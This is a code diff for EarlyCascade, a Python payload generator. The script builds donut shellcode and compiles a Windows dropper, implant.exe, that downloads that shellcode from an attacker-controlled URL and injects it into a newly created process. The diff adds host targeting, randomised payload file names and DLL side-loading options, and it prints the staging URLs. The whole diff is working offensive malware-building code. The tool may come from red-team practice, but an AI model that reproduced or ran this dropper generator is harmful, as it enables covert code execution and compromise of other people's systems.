@@ -41,22 +41,44 @@ def printCiphertext(ciphertext):
 	return '{ (char)0x' + ', (char)0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' }'
 
 
-def generatePayloads(binary, binaryArgs, rawShellCode, process, url):
+def getHelpExploration():
+        helpMessage = 'EarlyCascade generates a dropper that injects shellcode into a newly created process\n'
+        helpMessage += 'Usage:  Dropper EarlyCascade listenerDownload listenerBeacon -p <process> -t <targetHost>\n'
+        helpMessage += 'Options:\n'
+        helpMessage += '  -p, --process\t\t\tProcess to create for injection\n'
+        helpMessage += '  -t, --targetHost\t\tRestrict the dropper to run onto this host\n'
+
+        return helpMessage
+
+
+def generatePayloadsExploration(binary, binaryArgs, rawShellCode, url, aditionalArgs):
+
+        binary_, binaryArgs_, rawShellCode_, process, url_, targetHost, sideDll, sideDllPath = parseCmdLine(aditionalArgs)
+
+        droppersPath, shellcodesPath, cmdToRun = generatePayloads(binary, binaryArgs, rawShellCode, process, url, targetHost)
+
+        return droppersPath, shellcodesPath, cmdToRun
+
+
+def generatePayloads(binary, binaryArgs, rawShellCode, process, url, targetHost):
+        
+        if url[-1:] == "/":
+                url = url[:-1]
 
         print('[+] Parse url:')
         parsed_url = urlparse(url)
         schema = parsed_url.scheme
         ip = parsed_url.hostname
         port = parsed_url.port if parsed_url.port else (443 if schema == "https" else 80)
-        fullLocation = parsed_url.path
-        shellcodeFile = fullLocation.split('/')[-1]
+        shellcodeFile = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(15))
+        fullLocation = parsed_url.path + "/" + shellcodeFile
 
         print(" Schema:", schema)
         print(" IP Address:", ip)
         print(" Port:", port)
         print(" Full Location:", fullLocation)
         print(" shellcodeFile:", shellcodeFile)
-        print(" Process to injtect to:", process)
+        print(" Process to start:", process)
 
         print('\n[+] Generate shellcode to fetch with donut:')
         if binary:
@@ -93,14 +115,6 @@ def generatePayloads(binary, binaryArgs, rawShellCode, process, url):
                 f = open(shellcodePath, "wb")
                 f.write(shellcode)
                 f.close()
-
-        # f = open(shellcodePath, "r+b")
-        # shellcode = f.read()
-        # # shellcodeXored = xor(shellcode, XorKey).encode('utf-8')
-        # f.seek(0)
-        # f.write(shellcode)
-        # f.truncate()
-        # f.close()
                         
         print("\n[+] Compile injector with informations")
         print('generate cryptDef.h with given input ')
@@ -210,6 +224,7 @@ def generatePayloads(binary, binaryArgs, rawShellCode, process, url):
         output = popen.stdout.read()
         print(output.decode("utf-8") )
 
+        print('\n[+] Check generated files')
         if os.name == 'nt':
                 dropperExePath = os.path.join(Path(__file__).parent, 'bin\\implant.exe')
                 shellcodePath = os.path.join(Path(__file__).parent, 'bin\\'+shellcodeFile)
@@ -218,48 +233,92 @@ def generatePayloads(binary, binaryArgs, rawShellCode, process, url):
                 shellcodePath = os.path.join(Path(__file__).parent, 'bin/'+shellcodeFile)
 
         if not os.path.isfile(dropperExePath):
-                print("[+] Error: Dropper file don't exist")
-                return "", ""
-
+                print("[-] Error: Dropper file don't exist")
+                return [], [], "Error: Dropper file don't exist"
         if not os.path.isfile(shellcodePath):
-                print("[+] Error: Shellcode file don't exist")
-                return "", ""
+                print("[-] Error: Shellcode file don't exist")
+                return [], [], "Error: Shellcode file don't exist"
+        
+        print("\n[+] Done")
+        
+        url = parsed_url.path
+        if url[0] == "/":
+                url = url[1:]
 
-        print("[+] Done")
+        cmdToRun = "Generated:\n"
+        cmdToRun+= schema + "://" + ip + ":" + str(port) + "/" + url + "/" + shellcodeFile + "\n"
+        cmdToRun+= schema + "://" + ip + ":" + str(port) + "/" + url + "/" + "implant.exe" + "\n"
+        droppersPath = [dropperExePath]
+        shellcodesPath = [shellcodePath]
 
-        return dropperExePath, shellcodePath
+        print(droppersPath)
+        print(shellcodesPath)
+        print(cmdToRun)
+
+        return droppersPath, shellcodesPath, cmdToRun
 
 
-def main(argv):
 
-        if(len(argv)<2):
-                print ('On Windows:\nGenerateInjector.py -p msedge.exe -u https://10.10.10.10/location/shellcodeToFetch -b C:\\Windows\\System32\\calc.exe -a "some args"')
-                print ('On Windows:\nGenerateInjector.py -p msedge.exe -u https://10.10.10.10:8443/location/shellcodeToFetch -r C:\\users\\User\\Desktop\\shellcode')
-                exit()
+helpMessage = 'EarlyCascade generates a dropper that injects shellcode into a newly created process\n'
+helpMessage += 'Usage: EarlyCascade.py -p <process> -u <url> -b <binary> -a <args> -t <targetHost>\n'
+helpMessage += 'Options:\n'
+helpMessage += '  -h, --help\t\t\tShow this help message and exit\n'
+helpMessage += '  -p, --process\t\t\tProcess to create for injection\n'
+helpMessage += '  -u, --url\t\t\tURL to fetch shellcode from\n'
+helpMessage += '  -b, --binary\t\t\tBinary to create the shellcode from\n'
+helpMessage += '  -a, --args\t\t\tArguments to pass to binary during shellcode creation\n'
+helpMessage += '  -r  --rawShellcode\t\tRaw shellcode file, donut will not be used\n'
+helpMessage += '  -t, --targetHost\t\tRestrict the dropper to run onto this host\n'
 
+
+def parseCmdLine(argv):
+        
         binary=""
         binaryArgs=""
         rawShellCode=""
         process=""
         url=""
+        targetHost=""
+        sideDll=""
+        sideDllPath=""
 
-        opts, args = getopt.getopt(argv,"hb:a:r:u:p:",["binary=","args=","url=","process="])
+        opts, args = getopt.getopt(argv,"hb:a:r:u:p:t:s:d:",["binary=","args=","rawShellcode=","url=","process=","targetHost=","sideDll=","SideDllPathOnHostSystem="])
         for opt, arg in opts:
                 if opt == '-h':
-                        print ('On Windows:\nGenerateInjector.py -p msedge.exe -u https://10.10.10.10/location/shellcodeToFetch -b C:\\Windows\\System32\\calc.exe -a "some args"')
+                        print (helpMessage)
                         sys.exit()
                 elif opt in ("-b", "--binary"):
                         binary = arg
                 elif opt in ("-a", "--args"):
                         binaryArgs = arg
-                elif opt == '-r':
+                elif opt in ("-r", "--rawShellcode"):
                         rawShellCode = arg
-                elif opt == '-u':
+                elif opt in ("-u", "--url"):
                         url = arg
-                elif opt == '-p':
+                elif opt in ("-p", "--process"):
                         process = arg
+                elif opt in ("-t", "--targetHost"):
+                        targetHost = arg
+                elif opt in ("-s", "--sideDll"):
+                        sideDll = arg
+                elif opt in ("-d", "--SideDllPathOnHostSystem"):
+                        sideDllPath = arg
+
+        return binary, binaryArgs, rawShellCode, process, url, targetHost, sideDll, sideDllPath
+
+
+def main(argv):
+
+        if(len(argv)<2):
+                print (helpMessage)
+                exit()
         
-        dropperExePath, shellcodePath = generatePayloads(binary, binaryArgs, rawShellCode, process, url)
+        binary, binaryArgs, rawShellCode, process, url, targetHost, sideDll, sideDllPath = parseCmdLine(argv)
+
+        droppersPath, shellcodesPath, cmdToRun = generatePayloads(binary, binaryArgs, rawShellCode, process, url, targetHost)
+        print("\n[+] Dropper path  : ", droppersPath)
+        print("[+] Shellcode path: ", shellcodesPath)
+        print("[+] Command to run: ", cmdToRun)
 
         
 if __name__ == "__main__":
